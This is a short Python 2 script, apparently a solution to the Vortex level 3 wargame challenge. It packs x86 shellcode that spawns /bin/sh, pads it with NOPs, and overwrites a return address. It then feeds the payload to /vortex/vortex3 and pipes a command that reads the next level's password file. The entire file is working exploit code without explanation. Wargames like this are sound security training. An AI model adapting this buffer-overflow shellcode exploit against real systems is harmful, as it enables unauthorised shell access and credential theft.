import subprocess
import struct

sc = ("\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80")
dat = ""
dat += struct.pack("<I",0x90909090)
dat += struct.pack("<I",0x90909090)
dat += sc
dat += "\x90"*((0x84)-len(dat))
dat += struct.pack("<I",0x8048312)
f = open("kk",'w')
f.write(dat)
f.close()
p = subprocess.Popen(['/vortex/vortex3',dat],stdin = subprocess.PIPE, stdout = subprocess.PIPE)

p.stdin.write('cat /etc/vortex_pass/vortex4\n')
print p.communicate()
